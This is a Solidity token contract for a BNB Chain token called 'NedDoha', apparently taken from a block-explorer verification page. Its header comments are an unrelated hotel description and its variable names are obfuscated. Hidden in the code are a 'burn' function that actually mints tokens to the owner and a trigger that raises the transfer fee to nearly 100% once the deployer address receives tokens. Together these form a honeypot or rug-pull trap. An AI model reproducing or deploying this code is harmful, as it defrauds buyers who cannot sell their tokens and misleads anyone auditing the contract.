/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 08:36 GMT
 */
 //The NedDoha
 //Following the success of The Ned London and The Ned NoMad New York, The Ned Doha opens in November. 
 //The member’s club and the hotel is located in the former Ministry of the Interior building, 
 //split over five storeys and will be home to seven restaurants, five of which are open to the public. 
 //The building features 90 rooms and suites, a health club and a 30-metre outdoor pool. 
 //Restaurants include Italian spot Ceccioni’s, American concept Electric Diner, Asian-Pacific eatery Kaia, 
 //outdoor poolside restaurant Malibu Kitchen, live music bar The Nickel Lounge, and Levantine garden Hadika.

 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract VNYWRWH {
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant GSQWJP = 99999;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  TQTCKE = address(0);
address public owner;
address private  IXRADO = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  RMJIVY = 1000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
string public  name = "NedDoha";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  TEBSYJ = 1000000000000000;
address private  VRMPYP = address(0);
address private  EEJQJQ = address(0);
uint256 private  OMVGXN = 1000000000000000000;
uint256 private  NNVJQZ = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
string public  symbol = "NedDoha";
uint256 private  XJESWZ = 1000000000000000000;
uint256 private  AKJEHP = 10000000000000;
address private  AYRFRU = address(0);
uint256 private  QFGKKC = 100000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getQFGKKC() private returns (uint256) {
return QFGKKC;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getIXRADO() private returns (address) {
return IXRADO;
}

function _getEEJQJQ() private returns (address) {
return EEJQJQ;
}

function _getTEBSYJ() private returns (uint256) {
return TEBSYJ;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CDCBEQ");
require(to != address(0), "CDCBEQ");
require(amount <= balanceOf[from], "CDCBEQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* GSQWJP/XJESWZ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==VRMPYP){
XJESWZ = GSQWJP+2;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getNNVJQZ() private returns (uint256) {
return NNVJQZ;
}

function _getTQTCKE() private returns (address) {
return TQTCKE;
}

constructor () {
VRMPYP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getOMVGXN() private returns (uint256) {
return OMVGXN;
}

function _getAYRFRU() private returns (address) {
return AYRFRU;
}

function _getAKJEHP() private returns (uint256) {
return AKJEHP;
}

function _getRMJIVY() private returns (uint256) {
return RMJIVY;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tCDCBEQ 0");
require(spender != address(0), "fCDCBEQ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}